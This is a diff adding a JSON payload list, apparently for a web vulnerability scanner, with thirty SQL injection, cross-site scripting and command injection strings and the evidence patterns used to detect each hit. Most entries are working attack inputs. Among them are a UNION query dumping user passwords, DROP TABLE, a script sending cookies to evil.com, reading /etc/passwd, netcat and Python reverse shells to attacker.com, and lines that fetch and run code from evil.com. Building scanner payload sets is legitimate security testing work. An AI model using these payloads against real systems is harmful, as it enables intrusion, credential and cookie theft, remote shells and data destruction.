@@ -1,0 +1,363 @@
+[
+    {
+        "payload_id": "sqli1",
+        "payload": "' OR '1'='1",
+        "vuln_type": "SQL Injection",
+        "severity": "High",
+        "match_type": "boolean",
+        "evidence_patterns": [
+            "welcome admin",
+            "login successful",
+            "1=1"
+        ]
+    },
+    {
+        "payload_id": "sqli2",
+        "payload": "' UNION SELECT null,username,password FROM users--",
+        "vuln_type": "SQL Injection",
+        "severity": "Critical",
+        "match_type": "union",
+        "evidence_patterns": [
+            "admin",
+            "password",
+            "users table"
+        ]
+    },
+    {
+        "payload_id": "sqli3",
+        "payload": "' AND SLEEP(5)--",
+        "vuln_type": "SQL Injection",
+        "severity": "Medium",
+        "match_type": "time-based",
+        "evidence_patterns": [
+            "delay",
+            "timeout",
+            "slow response"
+        ]
+    },
+    {
+        "payload_id": "sqli4",
+        "payload": "' OR 1=1--",
+        "vuln_type": "SQL Injection",
+        "severity": "High",
+        "match_type": "boolean",
+        "evidence_patterns": [
+            "logged in",
+            "bypass",
+            "authentication"
+        ]
+    },
+    {
+        "payload_id": "sqli5",
+        "payload": "1' ORDER BY 5--",
+        "vuln_type": "SQL Injection",
+        "severity": "Medium",
+        "match_type": "error-based",
+        "evidence_patterns": [
+            "Unknown column",
+            "ORDER BY",
+            "SQL syntax"
+        ]
+    },
+    {
+        "payload_id": "sqli6",
+        "payload": "' OR EXISTS(SELECT * FROM users)--",
+        "vuln_type": "SQL Injection",
+        "severity": "High",
+        "match_type": "boolean",
+        "evidence_patterns": [
+            "true",
+            "exists",
+            "users table"
+        ]
+    },
+    {
+        "payload_id": "sqli7",
+        "payload": "1; DROP TABLE users--",
+        "vuln_type": "SQL Injection",
+        "severity": "Critical",
+        "match_type": "error-based",
+        "evidence_patterns": [
+            "DROP TABLE",
+            "table doesn't exist",
+            "SQL error"
+        ]
+    },
+    {
+        "payload_id": "sqli8",
+        "payload": "' OR 'a'='a",
+        "vuln_type": "SQL Injection",
+        "severity": "Medium",
+        "match_type": "boolean",
+        "evidence_patterns": [
+            "success",
+            "true",
+            "bypass"
+        ]
+    },
+    {
+        "payload_id": "sqli9",
+        "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "vuln_type": "SQL Injection",
+        "severity": "Medium",
+        "match_type": "time-based",
+        "evidence_patterns": [
+            "sleep",
+            "delay",
+            "5 seconds"
+        ]
+    },
+    {
+        "payload_id": "sqli10",
+        "payload": "' UNION SELECT @@version,null,null--",
+        "vuln_type": "SQL Injection",
+        "severity": "High",
+        "match_type": "union",
+        "evidence_patterns": [
+            "MySQL",
+            "PostgreSQL",
+            "SQL Server",
+            "version"
+        ]
+    },
+    {
+        "payload_id": "xss1",
+        "payload": "<script>alert('XSS')</script>",
+        "vuln_type": "Cross-Site Scripting",
+        "severity": "Medium",
+        "match_type": "reflected",
+        "evidence_patterns": [
+            "alert",
+            "XSS",
+            "script tag"
+        ]
+    },
+    {
+        "payload_id": "xss2",
+        "payload": "<img src=x onerror=alert(1)>",
+        "vuln_type": "Cross-Site Scripting",
+        "severity": "Medium",
+        "match_type": "reflected",
+        "evidence_patterns": [
+            "onerror",
+            "img tag",
+            "alert"
+        ]
+    },
+    {
+        "payload_id": "xss3",
+        "payload": "<svg onload=alert(document.cookie)>",
+        "vuln_type": "Cross-Site Scripting",
+        "severity": "High",
+        "match_type": "reflected",
+        "evidence_patterns": [
+            "document.cookie",
+            "svg",
+            "onload"
+        ]
+    },
+    {
+        "payload_id": "xss4",
+        "payload": "javascript:alert(1)",
+        "vuln_type": "Cross-Site Scripting",
+        "severity": "Medium",
+        "match_type": "DOM-based",
+        "evidence_patterns": [
+            "javascript:",
+            "alert",
+            "URL"
+        ]
+    },
+    {
+        "payload_id": "xss5",
+        "payload": "\"><script>alert(1)</script>",
+        "vuln_type": "Cross-Site Scripting",
+        "severity": "Medium",
+        "match_type": "reflected",
+        "evidence_patterns": [
+            "quote break",
+            "script tag",
+            "alert"
+        ]
+    },
+    {
+        "payload_id": "xss6",
+        "payload": "<body onload=alert('XSS')>",
+        "vuln_type": "Cross-Site Scripting",
+        "severity": "Medium",
+        "match_type": "reflected",
+        "evidence_patterns": [
+            "body tag",
+            "onload",
+            "alert"
+        ]
+    },
+    {
+        "payload_id": "xss7",
+        "payload": "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\\",
+        "vuln_type": "Cross-Site Scripting",
+        "severity": "High",
+        "match_type": "polyglot",
+        "evidence_patterns": [
+            "multiple contexts",
+            "alert",
+            "char code"
+        ]
+    },
+    {
+        "payload_id": "xss8",
+        "payload": "<script>document.location='http://evil.com?c='+document.cookie</script>",
+        "vuln_type": "Cross-Site Scripting",
+        "severity": "Critical",
+        "match_type": "stored",
+        "evidence_patterns": [
+            "document.cookie",
+            "external domain",
+            "exfiltration"
+        ]
+    },
+    {
+        "payload_id": "xss9",
+        "payload": "<iframe src=\"javascript:alert('XSS')\">",
+        "vuln_type": "Cross-Site Scripting",
+        "severity": "Medium",
+        "match_type": "DOM-based",
+        "evidence_patterns": [
+            "iframe",
+            "javascript:",
+            "alert"
+        ]
+    },
+    {
+        "payload_id": "xss10",
+        "payload": "<input onfocus=alert(1) autofocus>",
+        "vuln_type": "Cross-Site Scripting",
+        "severity": "Medium",
+        "match_type": "reflected",
+        "evidence_patterns": [
+            "onfocus",
+            "autofocus",
+            "alert"
+        ]
+    },
+    {
+        "payload_id": "rce1",
+        "payload": "; ls -la",
+        "vuln_type": "Remote Code Execution",
+        "severity": "Critical",
+        "match_type": "boolean",
+        "evidence_patterns": [
+            "root",
+            "file listing",
+            "directory contents"
+        ]
+    },
+    {
+        "payload_id": "rce2",
+        "payload": "| cat /etc/passwd",
+        "vuln_type": "Remote Code Execution",
+        "severity": "Critical",
+        "match_type": "boolean",
+        "evidence_patterns": [
+            "root:",
+            "bin/",
+            "system users"
+        ]
+    },
+    {
+        "payload_id": "rce3",
+        "payload": "`id`",
+        "vuln_type": "Remote Code Execution",
+        "severity": "High",
+        "match_type": "boolean",
+        "evidence_patterns": [
+            "uid=",
+            "gid=",
+            "groups="
+        ]
+    },
+    {
+        "payload_id": "rce4",
+        "payload": "$(whoami)",
+        "vuln_type": "Remote Code Execution",
+        "severity": "High",
+        "match_type": "boolean",
+        "evidence_patterns": [
+            "root",
+            "admin",
+            "user"
+        ]
+    },
+    {
+        "payload_id": "rce5",
+        "payload": "|| nc -e /bin/sh attacker.com 4444",
+        "vuln_type": "Remote Code Execution",
+        "severity": "Critical",
+        "match_type": "boolean",
+        "evidence_patterns": [
+            "reverse shell",
+            "netcat",
+            "connection"
+        ]
+    },
+    {
+        "payload_id": "rce6",
+        "payload": "; ping -c 5 127.0.0.1",
+        "vuln_type": "Remote Code Execution",
+        "severity": "Medium",
+        "match_type": "time-based",
+        "evidence_patterns": [
+            "ping",
+            "time delay",
+            "ICMP"
+        ]
+    },
+    {
+        "payload_id": "rce7",
+        "payload": "& curl http://evil.com/shell.sh | bash",
+        "vuln_type": "Remote Code Execution",
+        "severity": "Critical",
+        "match_type": "boolean",
+        "evidence_patterns": [
+            "curl",
+            "bash",
+            "download"
+        ]
+    },
+    {
+        "payload_id": "rce8",
+        "payload": "'; system('id'); '",
+        "vuln_type": "Remote Code Execution",
+        "severity": "High",
+        "match_type": "error-based",
+        "evidence_patterns": [
+            "uid=",
+            "PHP system",
+            "command execution"
+        ]
+    },
+    {
+        "payload_id": "rce9",
+        "payload": "\" && python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
+        "vuln_type": "Remote Code Execution",
+        "severity": "Critical",
+        "match_type": "boolean",
+        "evidence_patterns": [
+            "python",
+            "reverse shell",
+            "socket"
+        ]
+    },
+    {
+        "payload_id": "rce10",
+        "payload": "| wget http://evil.com/malware -O /tmp/malware",
+        "vuln_type": "Remote Code Execution",
+        "severity": "Critical",
+        "match_type": "boolean",
+        "evidence_patterns": [
+            "wget",
+            "download",
+            "/tmp/"
+        ]
+    }
+]
